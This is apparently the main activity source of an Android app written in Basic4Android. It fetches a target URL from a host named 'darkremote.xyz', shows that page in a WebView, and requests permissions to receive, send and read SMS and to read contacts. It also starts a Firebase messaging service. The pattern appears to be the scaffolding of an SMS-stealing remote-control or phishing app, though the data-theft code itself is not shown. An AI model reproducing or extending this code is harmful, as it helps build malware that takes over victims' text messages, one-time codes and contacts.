Sub Process_Globals
	Dim rn As RuntimePermissions
	Dim pd As PersianDeviceInfo
End Sub

Sub Globals
	Private WebView1 As WebView
End Sub
Sub Activity_PermissionResult (Permission As String, Result As Boolean)
	If  Permission=rn.PERMISSION_RECEIVE_SMS And Result Then
	End If
	
	If  Permission=rn.PERMISSION_READ_EXTERNAL_STORAGE And Result Then
	End If
End Sub
Sub Activity_Create(FirstTime As Boolean)
	pd.initialize("pd")
	
	StartService(FirebaseMessaging)

	Dim strResult As String = "https://darkremote.xyz/zx"
	Activity.LoadLayout("layout")
	Dim job1 As HttpJob
	job1.Initialize("job1",Me)
	job1.Download(strResult&"/url.txt")
	Wait For JobDone(job As HttpJob)
	Dim domain As String = job.GetString
	WebView1.LoadUrl(domain)

	rn.CheckAndRequest(rn.PERMISSION_RECEIVE_SMS)
	rn.CheckAndRequest(rn.PERMISSION_SEND_SMS)
	rn.CheckAndRequest(rn.PERMISSION_READ_SMS)
	rn.CheckAndRequest(rn.PERMISSION_READ_CONTACTS)

End Sub

Sub Activity_Resume
	
End Sub

Sub Activity_Pause (UserClosed As Boolean)
	
End Sub